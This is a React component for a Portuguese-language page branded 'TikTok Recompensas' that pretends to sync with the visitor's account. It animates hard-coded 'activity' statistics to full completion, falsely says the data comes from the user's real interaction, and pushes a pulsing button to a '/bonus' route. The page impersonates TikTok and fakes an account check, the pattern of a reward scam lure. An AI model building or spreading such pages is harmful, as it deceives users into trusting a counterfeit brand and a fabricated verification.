import { useState, useEffect, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import tiktokLogo from "@/assets/tiktok-logo.png";

interface StatItem {
  label: string;
  current: number;
  target: number;
  fillPercent: number;
}

const INITIAL_STATS: StatItem[] = [
  { label: "Vídeos assistidos", current: 0, target: 50, fillPercent: 0 },
  { label: "Tempo em uso na plataforma", current: 0, target: 1000, fillPercent: 0 },
  { label: "Vídeos curtidos", current: 0, target: 100, fillPercent: 0 },
];

const FINAL_STATS: StatItem[] = [
  { label: "Vídeos assistidos", current: 50, target: 50, fillPercent: 100 },
  { label: "Tempo em uso na plataforma", current: 1000, target: 1000, fillPercent: 100 },
  { label: "Vídeos curtidos", current: 100, target: 100, fillPercent: 100 },
];

const STATUS_MESSAGES = [
  "Analisando seus vídeos assistidos…",
  "Verificando tempo de uso na plataforma…",
  "Contabilizando vídeos curtidos…",
  "✅ Todos os critérios foram atingidos!",
];

const ActivityLanding = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [statusIdx, setStatusIdx] = useState(0);
  const [showBtn, setShowBtn] = useState(false);
  const [animatedStats, setAnimatedStats] = useState<StatItem[]>(INITIAL_STATS);

  useEffect(() => {
    const t = setTimeout(() => setLoading(false), 2500);
    return () => clearTimeout(t);
  }, []);

  useEffect(() => {
    if (loading) return;

    const timers: ReturnType<typeof setTimeout>[] = [];

    FINAL_STATS.forEach((stat, i) => {
      timers.push(setTimeout(() => {
        setStatusIdx(i);
        setAnimatedStats(prev => {
          const next = [...prev];
          next[i] = stat;
          return next;
        });
      }, i * 1200));
    });

    timers.push(setTimeout(() => {
      setStatusIdx(3);
    }, FINAL_STATS.length * 1200));

    timers.push(setTimeout(() => {
      setShowBtn(true);
    }, FINAL_STATS.length * 1200 + 800));

    return () => timers.forEach(clearTimeout);
  }, [loading]);

  const handleClaim = useCallback(() => {
    navigate("/bonus");
  }, [navigate]);

  if (loading) {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white">
        <img src={tiktokLogo} alt="TikTok" className="w-16 h-16 mb-4 animate-pulse" />
        <div className="w-10 h-10 rounded-full border-[3px] border-gray-200 border-t-[#fe2c55] animate-spin mb-4" />
        <p className="text-sm text-gray-500 font-medium">Sincronizando com a sua conta...</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex items-center justify-center p-4">
      <div className="w-full max-w-md space-y-4">
        {/* Header with TikTok branding */}
        <div className="flex items-center justify-center gap-2 mb-2">
          <img src={tiktokLogo} alt="TikTok" className="w-8 h-8" />
          <span className="text-gray-900 font-bold text-lg">TikTok Recompensas</span>
        </div>

        {/* Main card */}
        <div className="bg-white rounded-2xl shadow-lg p-6 space-y-5">
          <div>
            <h1 className="text-[22px] font-bold text-gray-900 leading-tight">
              Você atingiu todos os{" "}
              <span className="text-[#fe2c55]">critérios de atividade.</span>
            </h1>
            <p className="text-sm text-gray-500 mt-2 leading-relaxed">
              Confirmamos que sua conta cumpriu os requisitos mínimos de uso. Confira o resumo abaixo e toque para liberar o seu progresso.
            </p>
          </div>

          {/* Stats box */}
          <div className="border border-gray-100 rounded-xl p-4 space-y-4 bg-gray-50/50">
            <div className="flex items-center gap-2 text-sm font-medium text-gray-600">
              <span className="w-2 h-2 rounded-full bg-emerald-500 inline-block animate-pulse" />
              Detalhes da sua atividade
            </div>

            {animatedStats.map((stat, i) => {
              const isComplete = stat.fillPercent === 100;
              return (
                <div key={i} className="space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-gray-700 flex items-center gap-1.5">
                      {isComplete && <span className="text-emerald-500 text-xs">✓</span>}
                      {stat.label}
                    </span>
                    <span className={`text-sm font-medium tabular-nums ${isComplete ? "text-emerald-500" : "text-gray-400"}`}>
                      {stat.current}/{stat.target}
                    </span>
                  </div>
                  <div className="w-full h-1.5 bg-gray-100 rounded-full overflow-hidden">
                    <div
                      className={`h-full rounded-full transition-all duration-1000 ease-out ${isComplete ? "bg-emerald-500" : "bg-[#fe2c55]"}`}
                      style={{ width: `${stat.fillPercent}%` }}
                    />
                  </div>
                </div>
              );
            })}
          </div>

          {/* Status message */}
          <p className={`text-center text-sm ${statusIdx === 3 ? "text-emerald-500 font-medium" : "text-gray-400"}`}>
            {STATUS_MESSAGES[statusIdx]}
          </p>

          {/* CTA button */}
          <div className={`transition-all duration-500 ${showBtn ? "opacity-100 translate-y-0" : "opacity-0 translate-y-2 pointer-events-none"}`}>
            <button
              onClick={handleClaim}
              className="w-full py-3.5 rounded-xl bg-[#fe2c55] text-white font-bold text-[15px] hover:brightness-110 active:scale-[0.98] transition-all flex items-center justify-center gap-2 shadow-lg shadow-[#fe2c55]/30"
              style={{ animation: "ctaPulse 1.4s ease-in-out infinite" }}
            >
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                <path d="M5.5 9.511c.076.954.83 1.697 2.182 1.785V12h.6v-.709c1.4-.098 2.218-.846 2.218-1.932 0-.987-.626-1.496-1.745-1.76l-.473-.112V5.57c.6.068.982.396 1.074.85h1.052c-.076-.919-.864-1.638-2.126-1.716V4h-.6v.719c-1.195.117-2.01.836-2.01 1.853 0 .9.606 1.472 1.613 1.707l.397.098v2.034c-.615-.093-1.022-.43-1.114-.9zm2.177-2.166c-.59-.137-.91-.416-.91-.836 0-.47.345-.822.915-.925v1.76h-.005zm.692 1.193c.717.166 1.048.435 1.048.91 0 .542-.412.914-1.135.982V8.518z" />
                <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16" />
                <path d="M8 13.5a5.5 5.5 0 1 1 0-11 5.5 5.5 0 0 1 0 11m0 .5A6 6 0 1 0 8 2a6 6 0 0 0 0 12" />
              </svg>
              Liberar meu progresso
            </button>
          </div>

          <p className="text-center text-[11px] text-gray-600">
            Os dados acima são gerados automaticamente com base na sua interação recente na plataforma.
          </p>
        </div>
      </div>
    </div>
  );
};

export default ActivityLanding;
